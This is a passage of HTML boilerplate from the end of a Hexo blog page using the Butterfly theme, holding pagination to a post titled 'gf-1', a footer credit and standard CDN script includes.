src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/06/10/gf-1/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">gf-1</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 徐小宇</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
